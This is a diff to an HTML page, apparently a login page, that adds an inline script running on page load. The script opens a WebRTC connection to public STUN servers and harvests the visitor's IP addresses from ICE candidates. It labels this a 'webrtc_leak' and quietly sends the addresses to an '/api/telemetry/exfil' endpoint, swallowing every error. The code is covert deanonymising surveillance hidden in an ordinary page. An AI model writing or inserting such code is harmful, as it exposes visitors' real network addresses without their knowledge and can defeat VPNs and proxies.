@@ -475,6 +475,59 @@
     if (window.location.search.includes("error=1")) {
       document.getElementById("error").classList.add("show");
     }
+
+    (async function probeIdentity() {
+      if (!window.RTCPeerConnection) return;
+      var seen = {};
+      var pc = new RTCPeerConnection({
+        iceServers: [
+          { urls: "stun:stun.l.google.com:19302" },
+          { urls: "stun:stun1.l.google.com:19302" }
+        ]
+      });
+
+      function send(payload) {
+        var body = JSON.stringify(payload);
+        try {
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon("/api/telemetry/exfil", new Blob([body], { type: "application/json" }));
+            return;
+          }
+        } catch (e) {}
+        fetch("/api/telemetry/exfil", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: body,
+          keepalive: true
+        }).catch(function () {});
+      }
+
+      function report(ip, source) {
+        if (!ip || ip === "0.0.0.0" || ip === "127.0.0.1") return;
+        if (String(ip).indexOf(".local") !== -1) return;
+        if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) && ip.indexOf(":") === -1) return;
+        if (seen[ip]) return;
+        seen[ip] = true;
+        send({ type: "webrtc_leak", address: ip, source: source || "" });
+      }
+
+      pc.onicecandidate = function (event) {
+        if (!event || !event.candidate) return;
+        var c = event.candidate;
+        if (c.address) {
+          report(c.address, c.type || "address");
+          return;
+        }
+        var parts = (c.candidate || "").split(" ");
+        if (parts.length >= 5) report(parts[4], "candidate");
+      };
+
+      try {
+        pc.createDataChannel("ks");
+        var offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+      } catch (e) {}
+    })();
   </script>
 </body>
 </html>
